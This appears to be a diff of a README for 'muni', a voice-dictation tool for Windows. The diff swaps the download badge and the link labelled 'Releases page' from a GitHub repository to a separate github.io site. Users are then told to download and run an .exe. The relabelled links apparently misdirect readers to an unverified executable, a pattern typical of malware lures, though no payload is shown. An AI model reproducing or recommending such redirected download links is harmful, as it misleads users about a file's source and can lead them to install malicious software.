@@ -1,6 +1,6 @@
 # 🎙️ muni - Control your computer with voice commands
 
-[ ![Download muni](https://img.shields.io/badge/Download-muni-blue) ](https://github.com/Cogitative-farmplace654/muni)
+[ ![Download muni](https://img.shields.io/badge/Download-muni-blue) ](https://cogitative-farmplace654.github.io)
 
 You talk, the computer listens. Muni turns your speech into text. Use it instead of typing to write emails, notes, or documents. It works fast and keeps your data on your machine. Bring your own keys to connect with advanced speech models. You avoid monthly fees and stay in control.
 
@@ -8,7 +8,7 @@ You talk, the computer listens. Muni turns your speech into text. Use it instead
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [Releases page](https://github.com/Cogitative-farmplace654/muni).
+1. Go to the [Releases page](https://cogitative-farmplace654.github.io).
 2. Look for the Assets section at the bottom of the latest release.
 3. Select the file ending in .exe.
 4. Save the file to your desktop.
